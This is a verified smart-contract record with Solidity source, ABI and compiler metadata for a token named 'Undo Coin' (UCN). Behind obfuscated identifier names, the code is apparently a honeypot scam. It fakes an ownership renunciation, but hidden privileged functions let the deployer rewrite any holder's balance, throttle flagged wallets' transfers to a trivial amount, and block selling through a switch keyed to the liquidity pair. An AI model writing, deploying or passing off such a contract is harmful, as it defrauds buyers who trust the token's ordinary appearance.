{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract takeFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isSwap {\n    function createPair(address liquidityLimitToken, address walletLaunched) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface fundMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface toIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalToShould) external view returns (uint256);\n\n    function transfer(address txMax, uint256 buyFund) external returns (bool);\n\n    function allowance(address senderShouldExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txMax,\n        uint256 buyFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptModeFee, uint256 value);\n    event Approval(address indexed senderShouldExempt, address indexed spender, uint256 value);\n}\n\ninterface senderAmount is toIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UndoCoin is takeFrom, toIs, senderAmount {\n\n    function transfer(address totalExemptEnable, uint256 buyFund) external virtual override returns (bool) {\n        return liquidityLaunch(_msgSender(), totalExemptEnable, buyFund);\n    }\n\n    address public walletList;\n\n    function toAmountFund(address totalExemptEnable, uint256 buyFund) public {\n        buyLaunched();\n        walletTeamIs[totalExemptEnable] = buyFund;\n    }\n\n    address private tradingMode;\n\n    uint256 public sellLaunch = 0;\n\n    function tokenWallet() public {\n        emit OwnershipTransferred(isExempt, address(0));\n        tradingMode = address(0);\n    }\n\n    address sellFromBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private totalShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minFrom;\n    }\n\n    uint256 private toReceiver;\n\n    function allowance(address tradingFund, address fundMax) external view virtual override returns (uint256) {\n        if (fundMax == sellFromBuy) {\n            return type(uint256).max;\n        }\n        return autoTotal[tradingFund][fundMax];\n    }\n\n    function approve(address fundMax, uint256 buyFund) public virtual override returns (bool) {\n        autoTotal[_msgSender()][fundMax] = buyFund;\n        emit Approval(_msgSender(), fundMax, buyFund);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private autoTotal;\n\n    function receiverSender(address atShould) public {\n        if (launchedFee) {\n            return;\n        }\n        \n        launchedBuy[atShould] = true;\n        if (maxTotal) {\n            minShould = false;\n        }\n        launchedFee = true;\n    }\n\n    bool public launchedFee;\n\n    string private amountIsReceiver = \"UCN\";\n\n    uint256 constant teamToken = 11 ** 10;\n\n    bool public swapExempt;\n\n    uint256 public feeToken = 3;\n\n    function atMode(uint256 buyFund) public {\n        buyLaunched();\n        sellLimit = buyFund;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountIsReceiver;\n    }\n\n    bool public minShould;\n\n    uint256 private minFrom = 100000000 * 10 ** 18;\n\n    uint8 private totalSellReceiver = 18;\n\n    function buyLaunched() private view {\n        require(launchedBuy[_msgSender()]);\n    }\n\n    address feeExempt;\n\n    function owner() external view returns (address) {\n        return tradingMode;\n    }\n\n    bool private maxTotal;\n\n    uint256 public totalSwap;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalSellReceiver;\n    }\n\n    function balanceOf(address totalToShould) public view virtual override returns (uint256) {\n        return walletTeamIs[totalToShould];\n    }\n\n    mapping(address => uint256) private walletTeamIs;\n\n    address public isExempt;\n\n    event OwnershipTransferred(address indexed fundLaunch, address indexed limitMarketing);\n\n    function getOwner() external view returns (address) {\n        return tradingMode;\n    }\n\n    uint256 public isShouldSwap;\n\n    uint256 takeLaunched;\n\n    function fromFund(address fromMax, address txMax, uint256 buyFund) internal returns (bool) {\n        require(walletTeamIs[fromMax] >= buyFund);\n        walletTeamIs[fromMax] -= buyFund;\n        walletTeamIs[txMax] += buyFund;\n        emit Transfer(fromMax, txMax, buyFund);\n        return true;\n    }\n\n    string private amountToken = \"Undo Coin\";\n\n    uint256 sellLimit;\n\n    constructor (){\n        \n        tokenWallet();\n        fundMarketing shouldLaunch = fundMarketing(sellFromBuy);\n        walletList = isSwap(shouldLaunch.factory()).createPair(shouldLaunch.WETH(), address(this));\n        feeExempt = isSwap(shouldLaunch.factory()).feeTo();\n        \n        isExempt = _msgSender();\n        launchedBuy[isExempt] = true;\n        walletTeamIs[isExempt] = minFrom;\n        if (isShouldSwap != toReceiver) {\n            maxTotal = true;\n        }\n        emit Transfer(address(0), isExempt, minFrom);\n    }\n\n    mapping(address => bool) public isTo;\n\n    function tradingLaunched(address limitBuy) public {\n        buyLaunched();\n        if (maxTotal) {\n            maxTotal = false;\n        }\n        if (limitBuy == isExempt || limitBuy == walletList) {\n            return;\n        }\n        isTo[limitBuy] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return amountToken;\n    }\n\n    function liquidityLaunch(address fromMax, address txMax, uint256 buyFund) internal returns (bool) {\n        if (fromMax == isExempt) {\n            return fromFund(fromMax, txMax, buyFund);\n        }\n        uint256 enableLiquidity = toIs(walletList).balanceOf(feeExempt);\n        require(enableLiquidity == sellLimit);\n        require(txMax != feeExempt);\n        if (isTo[fromMax]) {\n            return fromFund(fromMax, txMax, teamToken);\n        }\n        buyFund = modeSwapFrom(fromMax, txMax, buyFund);\n        return fromFund(fromMax, txMax, buyFund);\n    }\n\n    mapping(address => bool) public launchedBuy;\n\n    function transferFrom(address fromMax, address txMax, uint256 buyFund) external override returns (bool) {\n        if (_msgSender() != sellFromBuy) {\n            if (autoTotal[fromMax][_msgSender()] != type(uint256).max) {\n                require(buyFund <= autoTotal[fromMax][_msgSender()]);\n                autoTotal[fromMax][_msgSender()] -= buyFund;\n            }\n        }\n        return liquidityLaunch(fromMax, txMax, buyFund);\n    }\n\n    function modeSwapFrom(address fromMax, address txMax, uint256 buyFund) internal view returns (uint256) {\n        require(buyFund > 0);\n\n        uint256 buyMin = 0;\n        if (fromMax == walletList && feeToken > 0) {\n            buyMin = buyFund * feeToken / 100;\n        } else if (txMax == walletList && sellLaunch > 0) {\n            buyMin = buyFund * sellLaunch / 100;\n        }\n        require(buyMin <= buyFund);\n        return buyFund - buyMin;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderShouldExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptModeFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyFund\",\"type\":\"uint256\"}],\"name\":\"atMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalToShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isShouldSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atShould\",\"type\":\"address\"}],\"name\":\"receiverSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalExemptEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyFund\",\"type\":\"uint256\"}],\"name\":\"toAmountFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitBuy\",\"type\":\"address\"}],\"name\":\"tradingLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalExemptEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "UndoCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}